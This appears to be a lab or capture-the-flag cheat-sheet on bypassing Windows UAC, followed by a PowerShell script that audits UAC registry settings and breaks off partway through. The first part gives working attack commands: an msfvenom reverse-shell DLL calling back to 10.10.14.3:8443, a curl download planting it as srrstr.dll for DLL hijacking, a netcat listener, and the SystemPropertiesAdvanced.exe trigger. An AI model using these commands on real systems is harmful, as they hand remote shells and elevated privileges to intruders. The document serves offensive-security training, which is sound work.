# Check Groups
```powershell
whoami /groups

Administrator AND Medium Integrity 
```

# Creating Malicious DLL and Download
```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

nc -lvnp 8443
```

# Trigger and Bypass UAC
```powershell
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

# Check Regitries
```powershell
# Windows UAC & Token Policy Security Audit Script
Clear-Host
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "     WINDOWS UAC & REGISTRY SECURITY AUDIT REPORT        " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host ""

$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

# Array of policies, their secure baseline values, and technical descriptions
$Policies = @(
    @{ Name = "EnableLUA"; SecureValue = 1; Desc = "Overall UAC Mechanism Status" },
    @{ Name = "FilterAdministratorToken"; SecureValue = 1; Desc = "UAC Admin Approval Mode for Built-in Admin" },
    @{ Name = "ConsentPromptBehaviorAdmin"; SecureValue = 2; Desc = "UAC Prompt Behavior for Administrators" },
    @{ Name = "ConsentPromptBehaviorUser"; SecureValue = 3; Desc = "UAC Prompt Behavior for Standard Users" },
    @{ Name = "PromptOnSecureDesktop"; SecureValue = 1; Desc = "Secure Desktop Enforcement (Screen Dimming)" },
    @{ Name = "EnableSecureUIAPaths"; SecureValue = 1; Desc = "Enforce UIAccess Apps to run only from secure paths" },
    @{ Name = "ValidateAdminCodeSignatures"; SecureValue = 1; Desc = "Enforce Digital Signatures for UAC Elevation" },
    @{ Name = "EnableInstallerDetection"; SecureValue = 1; Desc = "Heuristic detection of installation/setup files" },
    @{ Name = "LocalAccountTokenFilterPolicy"; SecureValue = 0; Desc = "Remote Local Admin token restriction (PtH defense)" }
)

foreach ($Policy in $Policies) {
    $Name = $Policy.Name
    $SecureVal = $Policy.SecureValue
    $Desc = $Policy.Desc
    
    # Query the Registry key value
    $CurrentVal = Get-ItemProperty -Path $RegPath -Name $Name -ErrorAction SilentlyContinue | Select-Object -KeepProperty $Name -ExpandProperty $Name -ErrorAction SilentlyContinue

    # Handle default Windows behaviors if the registry key doesn't explicitly exist
    if ($null -eq $CurrentVal) {
        if ($Name -eq "LocalAccountTokenFilterPolicy") { $CurrentVal = 0 }
        else { $CurrentVal = "Not Defined (Default Baseline)" }
    }

    # Evaluate risk based on the current configuration
    $Status = "SECURE / COMPLIANT"
    $Color = "Green"

    # Specific vulnerability logic mapping
    if ($Name -eq "EnableLUA" -and $CurrentVal -eq 0) { 
        $Status = "CRITICAL VULNERABILITY (UAC is completely disabled!)"
        $Color = "Red" 
    }
    elseif ($Name -eq "ConsentPromptBehaviorAdmin" -and $CurrentVal -eq 0) { 
        $Status = "HIGH RISK (Elevates privileges silently without prompt)"
        $Color = "Red" 
    }
    elseif ($Name -eq "PromptOnSecureDesktop" -and $CurrentVal -eq 0) { 
        $Status = "MEDIUM RISK (Secure Desktop disabled. Vulnerable to UI spoofing/automated clicks)"
        $Color = "Yellow" 
    }
    elseif ($Name -eq "LocalAccountTokenFilterPolicy" -and $CurrentVal -eq 1) { 
        $Status = "HIGH RISK (Remote Local Admin restrictions bypassed. Allows easy Pass-The-Hash)"
        $Color = "Red" 
    }
    elseif ($CurrentVal -ne $SecureVal -and $CurrentVal -ne "Not Defined (Default Baseline)") {
        if ($Name -eq "ConsentPromptBehaviorAdmin" -and $CurrentVal -eq 5) {
            $Status = "NORMAL / DEFAULT CONFIGURATION"
            $Color = "Gray"
        } else {
            $Status = "POTENTIAL RISK (Non-optimal configuration)"
            $Color = "Yellow"
```
